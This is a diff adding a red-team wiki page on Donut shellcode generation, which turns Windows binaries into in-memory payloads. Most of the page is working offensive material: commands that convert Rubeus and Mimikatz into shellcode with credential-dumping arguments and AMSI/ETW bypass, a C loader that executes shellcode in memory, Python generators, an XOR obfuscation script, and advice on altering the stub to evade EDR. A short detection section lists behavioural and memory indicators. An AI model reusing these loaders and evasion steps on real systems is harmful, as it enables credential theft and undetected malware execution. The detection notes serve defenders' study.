@@ -1,0 +1,236 @@
+---
+title: Donut Shellcode Generation
+mitre: T1027.009
+category: loaders
+group: Shellcode Generation
+summary: Convert any PE, .NET assembly, or VBScript into position-independent shellcode using the Donut framework for fileless in-memory execution.
+platform: [Windows]
+tags: ['C / C++', 'Python', '.NET', 'Shellcode']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: select input payload
+    desc: Donut accepts x86/x64 PE EXEs and DLLs, .NET assemblies (any version), VBScript, JScript, and XSL files.
+    dll: —
+  - call: donut generates a loader stub + encrypted payload
+    desc: The stub is position-independent x64/x86 shellcode. The payload is RC4+XOR encrypted and appended as a module.
+    dll: —
+  - call: stub decrypts and decompresses the module at runtime
+    desc: The stub uses API hashing to resolve LoadLibrary / CLR hosting interfaces without relying on the IAT.
+    dll: —
+  - call: execute payload in-process
+    desc: For .NET assemblies, the stub hosts the CLR and invokes the entry point. For native PEs, it performs in-memory loading.
+    dll: mscoree / clrjit
+  - call: 'optional: bypass AMSI and ETW in the stub'
+    desc: Donut can patch AmsiScanBuffer and EtwEventWrite before executing the payload.
+    dll: amsi / ntdll
+detections:
+  - src: AMSI
+    text: Donut payloads trigger AMSI scanning at CLR load time when running .NET assemblies — unless AMSI is patched by the stub.
+  - src: YARA
+    text: Donut loader stub has recognisable byte patterns (decryption loop, API hash table) that YARA rules can target.
+  - src: BEHAVIOURAL
+    text: Process that hosts the CLR (loads mscoree.dll + clrjit.dll) but has no .NET assembly in its import table — indicative of reflective CLR loading.
+  - src: MEMORY SCAN
+    text: RC4 key material and encrypted module blob in private RWX memory — matches Donut's memory layout at rest.
+related:
+  - mitre: T1027.009
+    title: Encrypted Shellcode Loader
+    desc: Manual shellcode loader without the PE/CLR hosting capability Donut provides.
+    href: /techniques/loaders/shellcode-loader
+  - mitre: T1027
+    title: Position-Independent Code
+    desc: PIC fundamentals underlying Donut's API resolution.
+    href: /techniques/loaders/position-independent-code
+  - mitre: T1562.001
+    title: AMSI Bypass
+    desc: Donut can optionally patch AMSI before executing the inner payload.
+    href: /techniques/evasion/amsi-bypass
+labKit:
+  - label: Donut (TheWover)
+    href: 'https://github.com/TheWover/donut'
+  - label: donut Python bindings
+    href: 'https://github.com/TheWover/donut'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Donut (TheWover, 2019) solves a fundamental problem in red team operations: **how to execute arbitrary Windows binaries entirely in memory without writing a file to disk**. Given any PE, .NET assembly, VBScript/JScript, or XSL file, Donut produces a self-contained position-independent shellcode blob that can be loaded by any shellcode injector.
+
+The output shellcode:
+- Is fully PIC (uses API hashing and PEB walking — no IAT dependencies).
+- Decrypts and executes the payload using RC4 + XOR.
+- Optionally patches `AmsiScanBuffer` and `EtwEventWrite` before execution.
+- Hosts the .NET CLR in-process for managed assemblies (compatible with any .NET version).
+- Handles PE loading with import resolution and base relocations.
+
+The practical implication is that any tool — Mimikatz, Rubeus, SharpHound, a custom C# implant — can be converted to shellcode and injected into a remote process via any of the injection techniques documented in this wiki.
+
+<Callout type="note">
+  Donut payloads are well-signatured by major EDR vendors as of 2025. The stub itself (API hash
+  table, decryption loop, CLR hosting pattern) is a known artefact. Effective use requires
+  customising the stub: change the hash seed, reorder operations, obfuscate the decryption
+  routine. Projects like Havoc and BruteRatel implement Donut-like generation with randomised stubs.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Generate shellcode from a .NET assembly (CLI)
+
+<CodeBlock
+  file="donut_generate.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Install
+git clone https://github.com/TheWover/donut && cd donut
+make  # Linux; on Windows: msbuild or compile with MSVC
+
+# Basic: convert Rubeus.exe to shellcode
+./donut -f Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus.bin
+
+# .NET assembly with AMSI + ETW bypass enabled
+./donut -f Rubeus.exe \
+    -p "asreproast /format:hashcat" \
+    -b 1 \       # bypass: 1=none, 2=abort on fail, 3=continue, 4=try
+    -e 3 \       # entropy: 3=random names + encryption (default)
+    -o rubeus_amsi.bin
+
+# Generate a 64-bit shellcode blob for a native x64 PE
+./donut -f mimikatz.exe \
+    -p "sekurlsa::logonpasswords exit" \
+    -a 2 \       # arch: 1=x86, 2=x64, 3=x86+x64 (default)
+    -o mimi.bin
+
+# Output: shellcode blob ready for injection`}
+/>
+
+### Load generated shellcode into memory and execute
+
+<CodeBlock
+  file="donut_load.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <stdio.h>
+
+// Read a shellcode file and execute it in the current process
+// (Replace with any injection primitive for remote execution)
+BOOL run_donut_shellcode(const char *sc_path) {
+    // Read the shellcode blob from disk (or embedded as a byte array)
+    FILE *f = fopen(sc_path, "rb");
+    if (!f) return FALSE;
+
+    fseek(f, 0, SEEK_END);
+    size_t len = ftell(f);
+    rewind(f);
+
+    BYTE *sc = (BYTE*)VirtualAlloc(NULL, len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    fread(sc, 1, len, f);
+    fclose(f);
+
+    // Flip to RX before executing
+    DWORD old;
+    VirtualProtect(sc, len, PAGE_EXECUTE_READ, &old);
+
+    // Execute directly (in-process; for injection, use WriteProcessMemory + CreateRemoteThread)
+    ((void(*)())sc)();
+
+    VirtualFree(sc, 0, MEM_RELEASE);
+    return TRUE;
+}`}
+/>
+
+### Python binding (programmatic generation)
+
+<CodeBlock
+  file="donut_python.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`# pip install donut-shellcode
+import donut
+
+# Generate shellcode from a .NET assembly in memory
+sc = donut.create(
+    file      = "Rubeus.exe",
+    params    = "kerberoast /outfile:hashes.txt",
+    arch      = donut.DONUT_ARCH_X64,
+    bypass    = donut.DONUT_BYPASS_CONTINUE,   # try AMSI bypass; continue if it fails
+    entropy   = donut.DONUT_ENTROPY_DEFAULT,
+    compress  = donut.DONUT_COMPRESS_LZNT1,
+)
+
+print(f"[+] Generated {len(sc)} bytes of shellcode")
+
+# Write to file for injection by another tool
+with open("payload.bin", "wb") as f:
+    f.write(sc)
+
+# Or format as a C array for embedding
+print("static const BYTE SHELLCODE[] = {")
+print(", ".join(f"0x{b:02x}" for b in sc))
+print("};")`}
+/>
+
+### Embed as C byte array (no file-on-disk)
+
+<CodeBlock
+  file="embed_donut.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`#!/usr/bin/env python3
+# Convert a shellcode .bin file to a C header with optional XOR layer
+import sys, random
+
+KEY = random.randint(1, 255)
+sc  = open(sys.argv[1], 'rb').read()
+enc = bytes(b ^ KEY for b in sc)
+
+print(f"#define SC_LEN  {len(enc)}")
+print(f"#define SC_KEY  0x{KEY:02x}")
+print(f"static const unsigned char PAYLOAD[] = {{")
+rows = [enc[i:i+16] for i in range(0, len(enc), 16)]
+for row in rows:
+    print("    " + ", ".join(f"0x{b:02x}" for b in row) + ",")
+print("};")`}
+/>
+
+## Donut configuration options
+
+| Flag | Option | Description |
+|---|---|---|
+| `-a` | `1/2/3` | Architecture: x86 / x64 / x86+x64 |
+| `-b` | `1-4` | AMSI/WLDP bypass: none / abort / continue / try |
+| `-e` | `1-3` | Entropy: none / random names / random names + encryption |
+| `-c` | string | .NET class name (for DLL with specific class) |
+| `-m` | string | .NET method name |
+| `-p` | string | Parameter string passed to payload |
+| `-z` | `1-4` | Compression: none / LZNT1 / Xpress / LZX |
+| `-f` | `1-9` | Output format: binary / C / Ruby / Python / PS / Hex / UUID / Go / Rust |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable detection is behavioural: a process that loads `mscoree.dll` and `clrjit.dll` without having a managed assembly declared in its PE import table is running a reflectively loaded .NET assembly — this is the Donut CLR hosting pattern. Combined with `malfind` output showing private RWX memory containing the decrypted payload, this is a confirmed indicator.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
